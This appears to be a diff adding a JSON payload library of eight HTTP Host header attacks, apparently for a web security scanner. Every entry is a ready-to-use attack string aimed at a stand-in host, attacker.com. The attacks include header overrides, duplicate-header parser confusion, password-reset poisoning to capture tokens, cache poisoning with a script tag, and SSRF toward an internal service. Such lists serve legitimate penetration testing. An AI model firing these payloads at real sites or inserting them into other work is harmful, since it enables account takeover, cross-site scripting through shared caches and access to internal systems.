@@ -1,0 +1,10 @@
+[
+  {"name":"Host Header Injection","category":"Host Header","description":"Inject attacker host in Host header","payload":"Host: attacker.com","tags":["basic","injection"]},
+  {"name":"X-Forwarded-Host","category":"Host Header","description":"Override host via X-Forwarded-Host","payload":"X-Forwarded-Host: attacker.com","tags":["x-forwarded-host","bypass"]},
+  {"name":"X-Host Header","category":"Host Header","description":"X-Host injection","payload":"X-Host: attacker.com","tags":["x-host"]},
+  {"name":"Duplicate Host Header","category":"Host Header","description":"Two Host headers for parser confusion","payload":"Host: target.com\nHost: attacker.com","tags":["duplicate","parser-confusion"]},
+  {"name":"Port in Host","category":"Host Header","description":"Port number injection","payload":"Host: attacker.com:80@target.com","tags":["port","confusion"]},
+  {"name":"Password Reset Poisoning","category":"Host Header","description":"Host injection to capture reset tokens","payload":"Host: attacker.com (during password reset)","tags":["password-reset","token-capture","critical"]},
+  {"name":"Cache Poison via Host","category":"Host Header","description":"Poison cache using Host header","payload":"Host: ><script>alert(1)</script>","tags":["cache-poison","xss"]},
+  {"name":"SSRF via Host","category":"Host Header","description":"SSRF via Host header manipulation","payload":"Host: internal.service.local","tags":["ssrf","internal"]}
+]
